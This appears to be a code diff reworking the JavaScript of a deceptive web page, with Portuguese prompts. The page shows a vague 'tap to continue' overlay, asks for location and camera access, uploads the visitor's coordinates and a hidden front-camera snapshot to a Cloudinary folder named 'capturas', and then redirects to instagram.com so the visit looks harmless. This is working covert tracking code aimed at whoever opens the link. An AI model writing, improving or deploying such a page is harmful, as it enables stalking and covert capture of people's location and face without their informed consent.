@@ -23,91 +23,84 @@
     const uploadPreset = 'upload';
     const folderName = 'capturas';
     const overlay = document.getElementById('overlay');
-    const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+    const geoOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-    function uploadLocation(lat, lon) {
+    function show(message) {
+      overlay.textContent = message;
+      overlay.style.display = 'flex';
+    }
+    function hide() {
+      overlay.style.display = 'none';
+    }
+
+    // Passo 1: chamar getCurrentPosition diretamente no clique
+    function askLocation() {
+      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOptions);
+    }
+    function onGeoError() {
+      show('Localização negada. Toque para permitir a localização');
+      overlay.onclick = askLocation;
+    }
+    function onGeoSuccess(position) {
+      hide();
+      // upload location
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
       const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
       const form = new FormData();
       form.append('file', blob, `localizacao_${Date.now()}.txt`);
       form.append('upload_preset', uploadPreset);
       form.append('folder', folderName);
-      return fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form });
-    }
-
-    function captureAndUploadPhoto() {
-      return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-        .then(stream => {
-          const video = document.createElement('video');
-          video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
-          video.srcObject = stream;
-          return new Promise(res => video.onloadedmetadata = res)
-            .then(() => new Promise(r => video.play() || r()))
-            .then(() => new Promise(r => setTimeout(r, 500)))
-            .then(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(t => t.stop());
-              return new Promise((resolve) => {
-                canvas.toBlob(async blob => {
-                  const form = new FormData();
-                  form.append('file', blob);
-                  form.append('upload_preset', uploadPreset);
-                  form.append('folder', folderName);
-                  const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: form });
-                  const data = await resp.json();
-                  resolve(data.secure_url);
-                }, 'image/png');
-              });
-            });
+      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
+        .then(() => {
+          // após enviar localização, pedir câmera
+          show('Toque para permitir o acesso à câmera');
+          overlay.onclick = askCamera;
+        })
+        .catch(() => {
+          show('Erro ao enviar localização. Toque para tentar novamente.');
+          overlay.onclick = askLocation;
         });
     }
 
-    function showOverlay(message) {
-      overlay.textContent = message;
-      overlay.style.display = 'flex';
+    // Passo 2: chamar getUserMedia diretamente no clique
+    function askCamera() {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          hide();
+          const video = document.createElement('video');
+          video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
+          video.srcObject = stream;
+          video.onloadedmetadata = () => video.play();
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(t => t.stop());
+            canvas.toBlob(blob => {
+              const imgForm = new FormData();
+              imgForm.append('file', blob);
+              imgForm.append('upload_preset', uploadPreset);
+              imgForm.append('folder', folderName);
+              fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
+                .then(() => { window.location.href = 'https://instagram.com'; })
+                .catch(() => {
+                  show('Erro ao enviar foto. Toque para tentar novamente.');
+                  overlay.onclick = askCamera;
+                });
+            }, 'image/png');
+          }, 500);
+        })
+        .catch(() => {
+          show('Câmera negada. Toque para permitir o acesso à câmera');
+          overlay.onclick = askCamera;
+        });
     }
 
-    // Initial click handler
-    function initialClick() {
-      overlay.style.display = 'none';
-      navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError, options);
-    }
-
-    function onLocationError() {
-      showOverlay('Toque para permitir a localização');
-      overlay.onclick = initialClick;
-    }
-
-    async function onLocationSuccess(pos) {
-      try {
-        await uploadLocation(pos.coords.latitude, pos.coords.longitude);
-        // After location upload, prompt camera
-        showOverlay('Toque para permitir a câmera');
-        overlay.onclick = cameraClick;
-      } catch (e) {
-        console.error(e);
-        showOverlay('Erro ao enviar localização. Toque para tentar novamente.');
-        overlay.onclick = initialClick;
-      }
-    }
-
-    // Camera click handler
-    async function cameraClick() {
-      overlay.style.display = 'none';
-      try {
-        await captureAndUploadPhoto();
-        window.location.href = 'https://instagram.com';
-      } catch (e) {
-        console.error(e);
-        showOverlay('Permissão de câmera negada. Toque para tentar novamente.');
-        overlay.onclick = cameraClick;
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      showOverlay('Toque para continuar');
-      overlay.onclick = initialClick;
+    // Iniciar sequência
+    window.addEventListener('DOMContentLoaded', () => {
+      show('Toque para continuar');
+      overlay.onclick = askLocation;
     });
   </script>
 </body>
